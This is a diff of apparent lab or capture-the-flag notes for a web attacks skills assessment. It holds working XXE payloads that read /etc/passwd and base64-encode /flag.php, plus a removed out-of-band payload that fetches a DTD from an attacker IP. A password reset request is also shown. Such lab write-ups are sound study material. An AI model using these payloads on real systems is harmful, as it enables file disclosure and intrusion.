@@ -272,8 +272,7 @@ GET /reset.php?uid=52&token=e51a85fa-17ac-11ec-8e51-e78234eb7b0c&password=passwo
 
 ![web-attack-skills-assessment-admin-events](/images/web-attack-skills-assessment-admin-events.png)  
 
->read the flag at '/flag.php'.
-
+>Validate if can read system file.  
 
 ```xml
 <!DOCTYPE name [<!ENTITY fuzz SYSTEM "file:///etc/passwd">]>
@@ -284,20 +283,13 @@ GET /reset.php?uid=52&token=e51a85fa-17ac-11ec-8e51-e78234eb7b0c&password=passwo
             </root>
 ```
 
+>To Read the flag at '/flag.php' below [PHP Filter convert base64 encode resource method](https://academy.hackthebox.com/module/134/section/1204).  
 
-
-
-
-```
-<?xml version="1.0" encoding="UTF-8"?>
-<!DOCTYPE email [ 
-  <!ENTITY % remote SYSTEM "http://10.10.15.38:80/blind.dtd">
-  %remote;
-  %oob;
-]>
-<root>
-&content;
-</root>
-
-```
-
+```xml
+<!DOCTYPE name [<!ENTITY fuzz SYSTEM "php://filter/convert.base64-encode/resource=/flag.php">]>
+            <root>
+            <name>&fuzz;</name>
+            <details>fuzzing</details>
+            <date>2023-07-26</date>
+            </root>
+```  
